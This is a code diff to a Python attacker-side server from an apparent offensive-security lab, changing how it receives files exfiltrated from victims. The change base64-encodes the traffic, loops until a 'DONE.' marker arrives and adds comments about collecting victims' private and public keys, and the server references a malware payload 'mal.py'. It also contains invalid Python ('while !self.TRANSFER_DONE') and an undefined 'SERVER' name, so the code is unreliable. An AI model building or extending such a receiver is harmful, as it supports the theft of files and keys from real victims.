@@ -25,6 +25,7 @@ class Server:
     VICTIMS = []
     WORKING_DIR = '/home/attacker/Lab-On-Offensive-Attack/VictimsData'
     CODE_PATH = '/home/attacker/Lab-On-Offensive-Attack/mal.py'
+    TRANSFER_DONE = False
 
     def __init__(self, port):
         self._port = port
@@ -96,15 +97,20 @@ class Server:
         print("[CLIENT] : " + msg)
 
     def receive_victim_files(self, conn):
-        filename = conn.recv(Server.MAX_SIZE).decode(Server.FORMAT)
+        filename = base64.b64decode(conn.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
+
+        if filename == "DONE.":
+            self.TRANSFER_DONE = True
+            return
+        
         print("[RECV] Receiving the filename.")
         file = open(filename, "w")
-        conn.send("Filename received.".encode(Server.FORMAT))
+        conn.send(base64.b64encode("Filename received.".encode(Server.FORMAT)))
 
-        data_file = conn.recv(Server.MAX_SIZE).decode(Server.FORMAT)
+        data_file = base64.b64decode(conn.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
         print("[RECV] Receiving the file data.")
         file.write(data_file)
-        conn.send("Filename received.".encode(Server.FORMAT))
+        conn.send(base64.b64encode("Filename received.".encode(Server.FORMAT)))
 
         file.close() 
 
@@ -135,7 +141,14 @@ class Server:
                     
                     #command to save the private and public key in /home/attacker/Lab-On-Offensive-Attack/VictimsData
 
-                    self.receive_victim_files(connection)
+                    #key_name = base64.b64encode('keyname'.encode(SERVER.FORMAT))
+                    #connection.send(key_name)
+
+                    #key = base64.b64encode('key file'.encode(SERVER.FORMAT))
+                    #connection.send(key)
+
+                    while !self.TRANSFER_DONE:
+                        self.receive_victim_files(connection)
 
                     
                 else:
